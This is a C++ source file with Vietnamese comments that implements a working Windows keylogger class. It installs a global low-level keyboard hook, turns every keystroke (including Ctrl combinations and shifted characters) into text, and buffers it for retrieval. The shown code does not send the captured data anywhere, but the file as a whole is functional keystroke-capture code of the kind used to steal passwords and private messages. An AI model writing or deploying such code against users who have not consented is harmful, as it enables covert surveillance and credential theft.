#include "Keylogger.h"
#include <iostream>

Keylogger* g_KeyloggerInstance = nullptr;

// Constructor: Khởi tạo các trạng thái ban đầu
Keylogger::Keylogger() : _isRunning(false), _hook(NULL), _threadId(0) {
    g_KeyloggerInstance = this;
}

// Destructor: Đảm bảo dừng thread và gỡ hook khi hủy đối tượng
Keylogger::~Keylogger() {
    StopKeyLogging();
    g_KeyloggerInstance = nullptr;
}

// --- HÀM CALLBACK (CỬA NGÕ NHẬN TÍN HIỆU TỪ WINDOWS) ---
LRESULT CALLBACK Keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // Chỉ xử lý khi có sự kiện nhấn phím (WM_KEYDOWN)
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;

        if (g_KeyloggerInstance) {
            g_KeyloggerInstance->ProcessKey(pKey->vkCode);
        }
    }
    // BẮT BUỘC: Chuyển tiếp sự kiện cho ứng dụng khác xử lý (để không bị liệt phím)
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// --- HÀM XỬ LÝ LOGIC CHÍNH: DỊCH MÃ PHÍM SANG TEXT ---
// [ProcessKey] Xu ly logic chinh: Chuyen doi ma phim (VK Code) sang ky tu van ban
void Keylogger::ProcessKey(DWORD vkCode) {
    std::string keyName = "";

    switch (vkCode) {
        // --- 1. NHÓM PHÍM MODIFIERS (QUAN TRỌNG ĐỂ BẮT NÚT CTRL) ---
        // Phải giữ các dòng case này thì mới bắt được khi nhấn nút Ctrl đơn lẻ
    case VK_LCONTROL:
    case VK_RCONTROL:
    case VK_CONTROL:    keyName = "[CTRL]"; break;

    case VK_LSHIFT:
    case VK_RSHIFT:
    case VK_SHIFT:      keyName = "[SHIFT]"; break;

    case VK_LMENU:
    case VK_RMENU:
    case VK_MENU:       keyName = "[ALT]"; break;

    case VK_CAPITAL:    keyName = "[CAPSLOCK]"; break;
    case VK_LWIN:       keyName = "[LWIN]"; break;
    case VK_RWIN:       keyName = "[RWIN]"; break;
    case VK_APPS:       keyName = "[MENU_APP]"; break;

        // --- 2. CÁC PHÍM CHỨC NĂNG KHÁC ---
    case VK_BACK:       keyName = "[BACK]"; break;
    case VK_TAB:        keyName = "[TAB]"; break;
    case VK_RETURN:     keyName = "\n"; break;
    case VK_SPACE:      keyName = " "; break;
    case VK_ESCAPE:     keyName = "[ESC]"; break;
    case VK_DELETE:     keyName = "[DEL]"; break;
    case VK_INSERT:     keyName = "[INS]"; break;
    case VK_HOME:       keyName = "[HOME]"; break;
    case VK_END:        keyName = "[END]"; break;
    case VK_PRIOR:      keyName = "[PAGE UP]"; break;
    case VK_NEXT:       keyName = "[PAGE DOWN]"; break;
    case VK_LEFT:       keyName = "[LEFT]"; break;
    case VK_UP:         keyName = "[UP]"; break;
    case VK_RIGHT:      keyName = "[RIGHT]"; break;
    case VK_DOWN:       keyName = "[DOWN]"; break;
    case VK_SNAPSHOT:   keyName = "[PRINTSCREEN]"; break;
    case VK_SCROLL:     keyName = "[SCROLL LOCK]"; break;
    case VK_PAUSE:      keyName = "[PAUSE]"; break;

        // --- 3. NUMPAD & MEDIA ---
    case VK_NUMLOCK:    keyName = "[NUM LOCK]"; break;
    case VK_NUMPAD0:    keyName = "0"; break;
    case VK_NUMPAD1:    keyName = "1"; break;
    case VK_NUMPAD2:    keyName = "2"; break;
    case VK_NUMPAD3:    keyName = "3"; break;
    case VK_NUMPAD4:    keyName = "4"; break;
    case VK_NUMPAD5:    keyName = "5"; break;
    case VK_NUMPAD6:    keyName = "6"; break;
    case VK_NUMPAD7:    keyName = "7"; break;
    case VK_NUMPAD8:    keyName = "8"; break;
    case VK_NUMPAD9:    keyName = "9"; break;
    case VK_MULTIPLY:   keyName = "*"; break;
    case VK_ADD:        keyName = "+"; break;
    case VK_SEPARATOR:  keyName = "|"; break;
    case VK_SUBTRACT:   keyName = "-"; break;
    case VK_DECIMAL:    keyName = "."; break;
    case VK_DIVIDE:     keyName = "/"; break;

    case VK_VOLUME_MUTE:        keyName = "[MUTE]"; break;
    case VK_VOLUME_DOWN:        keyName = "[VOL-]"; break;
    case VK_VOLUME_UP:          keyName = "[VOL+]"; break;
    case VK_MEDIA_NEXT_TRACK:   keyName = "[NEXT]"; break;
    case VK_MEDIA_PREV_TRACK:   keyName = "[PREV]"; break;
    case VK_MEDIA_STOP:         keyName = "[STOP]"; break;
    case VK_MEDIA_PLAY_PAUSE:   keyName = "[PLAY/PAUSE]"; break;

    case 0xFF:
    case 0x00:
        return;

        // --- 4. XỬ LÝ KÝ TỰ VĂN BẢN VÀ TỔ HỢP PHÍM ---
    default:
        // Xử lý dãy phím F1 -> F24
        if (vkCode >= VK_F1 && vkCode <= VK_F24) {
            keyName = "[F" + std::to_string(vkCode - VK_F1 + 1) + "]";
        }
        else {
            // Check xem có đang giữ Ctrl không (để bắt tổ hợp Ctrl+C, Ctrl+V...)
            // 0x8000 là bit kiểm tra phím đang được nhấn xuống
            bool isCtrlHeld = (GetKeyState(VK_CONTROL) & 0x8000) != 0;

            // Nếu đang giữ Ctrl VÀ phím nhấn là chữ/số -> In ra [CTRL+X]
            if (isCtrlHeld && ((vkCode >= 'A' && vkCode <= 'Z') || (vkCode >= '0' && vkCode <= '9'))) {
                keyName = "[CTRL+" + std::string(1, (char)vkCode) + "]";
            }
            // Nếu không giữ Ctrl -> Xử lý văn bản bình thường (có Shift/Caps)
            else {
                BYTE keyboardState[256];
                GetKeyboardState(keyboardState);

                // Cập nhật trạng thái Shift/Caps từ phần cứng
                if (GetKeyState(VK_SHIFT) & 0x8000) keyboardState[VK_SHIFT] = 0x80;
                else keyboardState[VK_SHIFT] = 0;

                if (GetKeyState(VK_CAPITAL) & 0x0001) keyboardState[VK_CAPITAL] = 0x01;
                else keyboardState[VK_CAPITAL] = 0;

                WORD asciiChar;
                int len = ToAscii(vkCode, MapVirtualKey(vkCode, MAPVK_VK_TO_VSC), keyboardState, &asciiChar, 0);

                if (len == 1) {
                    keyName = std::string(1, (char)asciiChar);
                }
            }
        }
        break;
    }

    if (!keyName.empty()) {
        std::lock_guard<std::mutex> lock(_mutex);
        _logBuffer += keyName;
    }
}

// --- VÒNG LẶP CỦA THREAD ---
void Keylogger::RunHookLoop() {
    _threadId = GetCurrentThreadId();

    // Cài đặt Hook bàn phím cấp thấp 
    _hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    if (!_hook) return;

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        if (msg.message == WM_QUIT) break;
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(_hook);
    _hook = NULL;
    _threadId = 0;
}

// --- HÀM BẮT ĐẦU ---
void Keylogger::StartKeyLogging() {
    if (_isRunning) return;
    _isRunning = true;
    _logBuffer = "";
    // Tạo thread riêng biệt để chạy Keylogger (không làm treo giao diện chính)
    _loggerThread = std::thread(&Keylogger::RunHookLoop, this);
}

// --- HÀM KẾT THÚC ---
void Keylogger::StopKeyLogging() {
    if (!_isRunning) return;
    _isRunning = false;
    if (_threadId != 0) {
        PostThreadMessage(_threadId, WM_QUIT, 0, 0);
    }
    if (_loggerThread.joinable()) {
        _loggerThread.join();
    }
}

// --- HÀM LẤY DỮ LIỆU ---
std::string Keylogger::GetLoggedKeys() {
    std::lock_guard<std::mutex> lock(_mutex);
    if (_logBuffer.empty()) return "";
    std::string data = _logBuffer;
    _logBuffer.clear();
    return data;
}